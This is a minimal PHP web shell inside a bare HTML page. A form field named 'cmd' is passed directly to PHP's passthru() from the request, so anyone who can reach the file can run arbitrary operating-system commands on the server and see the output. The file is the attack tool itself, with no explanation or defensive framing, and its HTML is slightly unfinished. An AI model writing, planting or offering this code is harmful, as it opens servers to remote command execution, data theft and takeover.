<html>
<body>

<form method="POST">
    <input name="cmd" id="cmd">

<?php

echo passthru ($_REQUEST["cmd"])

?>
</body>